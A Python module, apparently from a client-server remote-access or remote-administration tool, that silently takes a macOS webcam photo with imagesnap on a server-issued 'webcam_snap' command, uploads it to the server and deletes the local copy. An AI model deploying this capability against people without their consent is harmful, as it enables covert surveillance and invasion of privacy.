import os
import subprocess

from core.utils.formatting import get_size
from core.utils.artifact_naming import build_artifact_filename
from client.runtime.temp_workspace import make_client_temp_file, cleanup_temp_path


class MacMediaService:
    """
    macOS 摄像头拍照能力。
    """

    def __init__(self, owner):
        self.owner = owner

    def capture_webcam_photo(self):
        """拍照并上传到服务器"""
        temp_file = None

        try:
            result = subprocess.run(['which', 'imagesnap'], capture_output=True)
            if result.returncode != 0:
                return 0, '请安装 imagesnap: brew install imagesnap'

            temp_fd, temp_path = make_client_temp_file(
                'media_temp',
                prefix='webcam_',
                suffix='.jpg',
            )
            os.close(temp_fd)
            temp_file = temp_path
            self.owner.emit_progress(f'Client Temp Path: {temp_file}', level='info')

            capture = subprocess.run(
                ['imagesnap', '-w', '1', temp_file],
                capture_output=True,
                timeout=5,
            )
            if capture.returncode != 0:
                return 0, 'Failed to capture webcam photo'

            if os.path.getsize(temp_file) > 0:
                status, message = self.owner.http_file_transfer_service.upload_single_file_to_server_result(
                    temp_file,
                    category='webcam',
                    upload_name=build_artifact_filename('webcam', 'jpg'),
                    extra={'saved_from': 'client_command', 'source_command': 'webcam_snap'},
                )
                if not status:
                    return 0, f'Webcam upload failed: {message}'
                file_size = get_size(os.path.getsize(temp_file))
                return 1, f'Webcam photo captured ({file_size})'

            return 0, 'Failed to capture webcam photo'
        except Exception as e:
            return 0, f'Webcam capture failed: {e}'
        finally:
            if temp_file:
                cleanup_temp_path(temp_file)